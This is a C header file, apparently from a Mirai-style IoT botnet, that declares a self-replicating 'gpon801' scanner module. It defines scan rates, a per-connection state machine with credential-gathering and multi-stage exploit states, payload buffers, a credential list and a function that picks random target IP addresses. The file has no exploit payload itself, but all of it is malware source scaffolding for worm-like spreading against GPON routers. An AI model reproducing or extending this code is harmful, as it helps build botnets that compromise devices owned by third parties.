#ifdef SELFREP

#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef DEBUG
#define gpon801_SCANNER_MAX_CONNS   3
#define gpon801_SCANNER_RAW_PPS     788
#else
#define gpon801_SCANNER_MAX_CONNS   256
#define gpon801_SCANNER_RAW_PPS     788
#endif

#define gpon801_SCANNER_RDBUF_SIZE  1080
#define gpon801_SCANNER_HACK_DRAIN  64

struct gpon801_scanner_connection
{
    int fd, last_recv;
    enum
    {
        gpon801_SC_CLOSED,
        gpon801_SC_CONNECTING,
        gpon801_SC_GET_CREDENTIALS,
        gpon801_SC_EXPLOIT_STAGE2,
        gpon801_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[gpon801_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[256], payload_buf2[256];
    int credential_index;
};

void gpon801_scanner();
void gpon801_kill(void);

static void gpon801_setup_connection(struct gpon801_scanner_connection *);
static ipv4_t get_random_gpon801_ip(void);

#endif
